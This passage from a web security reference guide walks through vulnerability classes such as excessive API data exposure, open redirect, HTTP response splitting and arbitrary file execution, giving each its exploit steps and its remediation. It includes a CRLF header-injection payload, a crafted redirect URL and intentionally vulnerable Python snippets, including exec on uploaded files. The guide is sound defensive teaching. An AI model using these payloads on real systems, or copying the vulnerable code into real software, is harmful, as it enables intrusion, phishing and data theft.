1. Send duplicate parameters
2. Bypass WAF and security filters
3. Exploit inconsistent parsing
4. Override security parameters
5. Manipulate application logic
6. Bypass authentication checks
7. Inject malicious values

**Remediation:**
- Consistent parameter parsing across all layers
- Reject requests with duplicate parameters
- Use strict parameter validation
- Implement proper input handling
- Security testing with duplicate parameters
- Use framework built-in protections
- Validate parameter count
- Proper WAF configuration

---

### #29 Excessive Data Exposure

**Description:**
Application returns more data than necessary in API responses, exposing sensitive information that users shouldn't have access to.

**Types:**
- Over-fetching in APIs
- Sensitive fields in responses
- Debug information exposure
- Internal IDs and references
- PII exposure

**Real-World Scenario:**
FitnessTracker's mobile app connects to an API that returns user profile information. The app only displays basic info like name and workout stats, but the API actually returns much more sensitive data than necessary. Security researcher Amanda discovers this while analyzing the app's network traffic.

**How the Attack Unfolds:**
1. Amanda uses network monitoring tools to see what data the FitnessTracker app receives from its servers
2. She's shocked to find that every profile request returns complete user records including password hashes, Social Security numbers, and credit card information
3. The mobile app ignores most of this data, but Amanda can see everything in the network traffic
4. She writes a simple script to query the API for thousands of user profiles, collecting a massive database of personal information
5. Amanda could sell this data to identity thieves, crack password hashes to access other accounts, or use credit card numbers for fraud
6. The company has no idea this is happening because Amanda is using the legitimate API exactly as designed

**Remediation:**
- Implement field-level access control
- Use DTOs to control response structure
- Return only necessary data
- Implement data minimization principle
- Use GraphQL with proper resolvers
- Filter sensitive fields
- Regular API security audits
- Implement response schemas
- Use serialization controls

---

## Security Misconfigurations

### #6 Insufficient Password Policy

**Description:**
Weak or missing password requirements allow users to create easily compromised passwords, making accounts vulnerable to attacks.

**Types:**
- No minimum length requirement
- No complexity requirements
- No password history
- No expiration policy
- Allowing common passwords

**Example Scenario:**
Registration accepting any password:
```python
def register(username, password):
    # No validation
    user = User(username=username, password=hash(password))
    user.save()
```
Users can set passwords like "123", "password", "abc"

**How to Exploit:**
1. Create accounts with weak passwords
2. Brute force weak passwords
3. Use dictionary attacks
4. Credential stuffing with common passwords
5. Social engineering easier with simple passwords
6. Automated account takeover

**Remediation:**
- Enforce minimum length (12+ characters)
- Require complexity (mixed case, numbers, symbols)
- Check against common password lists
- Implement password strength meter
- Prevent password reuse
- Consider passphrase approach
- Implement MFA
- User education
- Regular password audits

---

### #7 No Email Verification

**Description:**
Application doesn't verify email addresses during registration, allowing fake accounts, spam, and potential security issues.

**Types:**
- No verification at all
- Optional verification
- Weak verification tokens
- No expiration on tokens

**Real-World Scenario:**
QuickChat, a new messaging app, wants to make registration as easy as possible, so they allow users to create accounts with any email address without verification. Users can start chatting immediately after entering an email and password. Troublemaker Alex exploits this to cause chaos and impersonate others.

**How the Attack Unfolds:**
1. Alex creates accounts using other people's email addresses: ceo@bigcompany.com, celebrity@famous.com, teacher@school.edu
2. He starts conversations with these fake accounts, pretending to be important people
3. Alex creates hundreds of accounts with fake emails to spam popular chat rooms and bypass rate limits
4. He impersonates the real CEO to trick employees into sharing confidential information
5. When the real people try to register with their own email addresses, they're told the accounts already exist
6. Alex causes widespread confusion, spreads misinformation, and damages reputations while remaining anonymous

**Remediation:**
- Implement email verification
- Send verification link/code
- Use secure random tokens
- Set token expiration (24 hours)
- Limit account functionality until verified
- Implement rate limiting on registration
- CAPTCHA for registration
- Monitor for suspicious patterns
- Allow email change only with verification

---

### #20 Open Redirect

**Description:**
Application redirects users to URLs specified in unvalidated parameters, allowing attackers to redirect victims to malicious sites.

**Types:**
- URL parameter redirect
- Header-based redirect
- JavaScript redirect
- Meta refresh redirect

**Real-World Scenario:**
TrustedBank's login system includes a helpful feature that redirects customers back to the page they were trying to access after logging in. The URL looks like "trustedbank.com/login?next=/account-summary". Phishing expert Carlos realizes he can abuse this legitimate feature to make his scams more convincing.

**How the Attack Unfolds:**
1. Carlos creates a perfect replica of TrustedBank's login page on his malicious website "trustedbank-security.com"
2. He crafts a special URL: "trustedbank.com/login?next=https://trustedbank-security.com/steal-info"
3. Carlos sends phishing emails claiming "Urgent: Verify your account" with his crafted link
4. Victims click the link and see the real TrustedBank domain, so they trust it and enter their credentials
5. After successful login, TrustedBank automatically redirects them to Carlos's fake site
6. The fake site asks for additional "security verification" like Social Security numbers and credit card details, which victims provide because they think they're still on the real bank website

**Remediation:**
- Validate redirect URLs against whitelist
- Use relative paths only
- Implement redirect token system
- Warn users about external redirects
- Validate domain and protocol
- Use indirect references
- Avoid user-controlled redirects
- Implement proper URL parsing

---

### #21 HTTP Response Splitting

**Description:**
Attacker injects CRLF characters into HTTP headers, allowing them to inject additional headers or even entire HTTP responses.

**Types:**
- Header injection
- Response splitting
- Cache poisoning
- XSS via headers

**Example Scenario:**
Setting header with user input:
```python
name = request.args.get('name')
response.headers['X-User-Name'] = name
```
Attacker input: `John%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...`

**How to Exploit:**
1. Inject CRLF characters (\r\n)
2. Add malicious headers
3. Split response into multiple responses
4. Perform XSS attacks
5. Cache poisoning
6. Session fixation
7. Bypass security controls

**Remediation:**
- Validate and sanitize all header values
- Remove CRLF characters
- Use framework functions for headers
- Implement input validation
- Use security libraries
- Update web servers and frameworks
- Implement proper encoding
- Regular security testing

---

### #34 Arbitrary File Execution

**Description:**
Application allows execution of arbitrary files uploaded or specified by users, leading to remote code execution and complete system compromise.

**Types:**
- Direct file execution
- Script execution via upload
- Dynamic code evaluation
- Template injection leading to execution

**Example Scenario:**
Application executes uploaded files:
```python
filename = request.files['script'].filename
request.files['script'].save(filename)
exec(open(filename).read())  # Executes uploaded code
```

**How to Exploit:**
1. Upload malicious executable file
2. Trigger execution through application
3. Execute arbitrary code on server
4. Establish backdoor or web shell
5. Access sensitive data
6. Pivot to other systems
7. Complete server compromise

**Remediation:**
- Never execute user-uploaded files
- Disable dangerous functions (eval, exec)
- Implement strict file type validation
- Store uploads outside executable directories
- Use sandboxing and containerization
- Implement proper access controls
- Code review and security testing
- Use security frameworks
- Principle of least privilege
- Regular security audits

---

## Summary and Best Practices

### General Security Principles

1. **Defense in Depth**: Implement multiple layers of security controls
2. **Principle of Least Privilege**: Grant minimum necessary permissions
3. **Fail Securely**: Ensure failures don't compromise security
4. **Input Validation**: Validate all user input (whitelist approach)
5. **Output Encoding**: Encode output based on context
6. **Security by Design**: Build security into development process
7. **Regular Updates**: Keep all software and dependencies updated
8. **Security Testing**: Regular penetration testing and code reviews
9. **Monitoring and Logging**: Implement comprehensive logging and monitoring
10. **Incident Response**: Have a plan for security incidents

### Development Best Practices

- Use security frameworks and libraries
- Follow secure coding guidelines
- Implement automated security testing
- Regular dependency scanning
- Code reviews with security focus
- Security training for developers
- Use static and dynamic analysis tools
- Implement CI/CD security gates

### Deployment Best Practices

- Use HTTPS everywhere
- Implement security headers
- Regular security patches
- Network segmentation
- Firewall configuration
- Intrusion detection systems
- Regular backups
- Disaster recovery planning

---

**Document Version:** 1.0  
**Last Updated:** December 1, 2025  
**Classification:** Security Reference Guide
